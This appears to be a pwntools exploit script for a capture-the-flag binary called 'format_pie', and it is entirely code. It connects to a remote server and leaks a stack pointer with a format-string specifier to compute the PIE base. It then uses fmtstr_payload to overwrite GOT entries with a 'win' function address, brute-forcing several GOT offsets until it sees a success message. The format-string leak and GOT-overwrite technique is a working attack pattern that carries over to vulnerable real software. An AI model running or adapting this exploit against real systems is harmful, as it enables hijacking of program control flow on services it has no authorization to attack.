from pwn import *

exe = ELF("./format_pie")
context.binary = exe
# context.log_level = 'error'

def brute_force():
    # Local offsets
    local_got = 0x4000
    local_win = 0x1221
    
    # Remote shift
    shift = 0x8a
    remote_ret = 0x13d7
    remote_win = local_win + shift # 0x12ab
    
    # Try deltas around shift
    # 0x8a = 138.
    # Try offsets: 0x4088, 0x4090, etc.
    # Also try just 0x4000 + shift (unaligned) just in case, though unlikely for GOT.
    # But GOT is usually aligned.
    
    # Let's try a range of aligned offsets around 0x408a
    # 0x4080, 0x4088, 0x4090, 0x4098, 0x40a0
    
    candidates = [0x4088, 0x4090, 0x4080, 0x40a0, 0x4000, 0x3f80, 0x4018]
    
    for got_offset in candidates:
        print(f"Trying GOT offset {hex(got_offset)}")
        
        try:
            r = remote("34.93.66.31", 34429)
            
            # Leak
            r.sendlineafter(b"> ", b"%41$p")
            leak_str = r.recvline().strip().decode()
            leak_val = int(leak_str, 16)
            
            pie_base = leak_val - remote_ret
            
            target_addr = pie_base + got_offset
            value = pie_base + remote_win
            
            print(f"  Target: {hex(target_addr)}")
            print(f"  Value: {hex(value)}")
            
            # Overwrite
            writes = {target_addr: value}
            payload = fmtstr_payload(6, writes, write_size='short') # Try short write size
            r.sendlineafter(b"> ", payload)
            
            # Trigger
            r.sendlineafter(b"> ", b"trigger")
            
            # Check success
            try:
                resp = r.recvall(timeout=1).decode()
                if "Congratulations" in resp:
                    print(f"SUCCESS! GOT Offset: {hex(got_offset)}")
                    r.close()
                    return got_offset
            except:
                pass
            
            r.close()
        except Exception as e:
            print(f"Error: {e}")
            try:
                r.close()
            except:
                pass

if __name__ == "__main__":
    brute_force()
